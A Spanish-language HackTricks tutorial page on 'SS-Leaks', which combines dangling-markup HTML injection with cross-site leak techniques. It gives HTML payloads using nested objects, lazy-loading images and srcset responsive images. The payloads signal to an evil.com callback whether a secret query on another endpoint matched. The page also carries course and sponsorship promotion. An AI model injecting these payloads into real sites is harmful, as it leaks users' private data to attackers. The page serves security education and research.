# SS-Leaks

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Esto es una **mezcla** entre **dangling markup y XS-Leaks**. Por un lado, la vulnerabilidad permite **inyectar HTML** (pero no JS) en una p√°gina del **mismo origen** que la que vamos a atacar. Por otro lado, no vamos a **atacar** directamente la p√°gina donde podemos inyectar HTML, sino **otra p√°gina**.

## Objetos Anidados

Si el endpoint <mark style="color:yellow;">`/api/v1/leaky?secret=a`</mark> devuelve un c√≥digo de estado 404, entonces el `object` interno se carga, dando una callback a <mark style="color:yellow;">`https://evil.com?callback=a`</mark> y permiti√©ndonos saber que la consulta de b√∫squeda `a` no produjo resultados.
```html
<object data="/api/v1/leaky?secret=a">
<object data="https://evil.com?callback=a"></object>
</object>
```
### Carga Perezosa

¬øQu√© pasa si CSP bloquea objetos externos? Intentemos de nuevo con la siguiente CSP:

<mark style="color:yellow;">`Content-Security-Policy: default-src 'self'; img-src *;`</mark>

Nuestro `object` de callback anterior ya no funciona. En su lugar, podemos usar la carga perezosa de im√°genes [lazy loading](https://developer.mozilla.org/en-US/docs/Web/Performance/Lazy\_loading)! La siguiente imagen solo se cargar√° cuando sea visible y est√© a cierta distancia del viewport.
```html
<object data="/api/v1/leaky?secret=a">
<img src="https://evil.com?callback" loading="lazy">
</object>
```
### Im√°genes Responsivas

La t√©cnica anterior es excelente, pero depende de que nuestra inyecci√≥n de HTML est√© dentro del campo de visi√≥n del usuario.

Si la inyecci√≥n est√° fuera de pantalla y el usuario no se desplaza, ¬øpodemos seguir extrayendo datos? Por supuesto, podemos usar IDs de elementos y [scroll-to-text-fragment](https://chromestatus.com/feature/4733392803332096) para crear una URL que fuerce el desplazamiento, pero estos dependen de la interacci√≥n del usuario y no nos permiten lograr extracciones consistentes en un escenario real. Idealmente, queremos aprovechar la inyecci√≥n de HTML almacenada de manera confiable.

¬°Aqu√≠ entran las im√°genes responsivas! Espec√≠ficamente, los atributos `srcset` y `sizes` de las im√°genes.

{% code overflow="wrap" %}
```html
<object data="/api/v1/leaky?secret=a">
<iframe srcdoc="<img srcset='https://evil.com?callback=1 480w, https://evil.com?callback=0 800w' sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'>" width="1000px">
</object>
```
{% endcode %}

Hay varias cosas que analizar aqu√≠. Primero, recuerda que el iframe interno solo ser√° visible si el endpoint con el 'leak' devuelve un c√≥digo de estado 404.

Esto es importante porque ahora vamos a cargar condicionalmente la imagen dentro del iframe desde dos URLs diferentes. Utilizando el atributo `sizes`, podemos usar [media queries](https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_media_queries/Using_media_queries) para elegir de qu√© URL cargar la imagen, dependiendo del tama√±o del viewport.

{% code overflow="wrap" %}
```html
<img
srcset='https://evil.com?callback=0 800w, https://evil.com?callback=1 480w'
sizes='(min-width: 1000px) 800px, (max-width 999px) 480px'
>
```
{% endcode %}

Debido a que nuestro iframe tiene `width="1000px"`, sucede lo siguiente:

1. Si el endpoint con leak devuelve un c√≥digo de estado 404, el iframe se muestra y tiene un ancho de 1000px. La imagen dentro del iframe coincide con la media query `(min-width: 1000px)` y carga la imagen de 800px desde `https://evil.com?callback=0`.
2. Si el endpoint con leak devuelve un c√≥digo de estado 200, el iframe _no_ se muestra. Dado que la imagen no se est√° renderizando como parte de un iframe grande, coincide con la media query `(max-width 999px)` y carga la imagen de 480px desde `https://evil.com?callback=1`.

## Referencias

* [https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks](https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
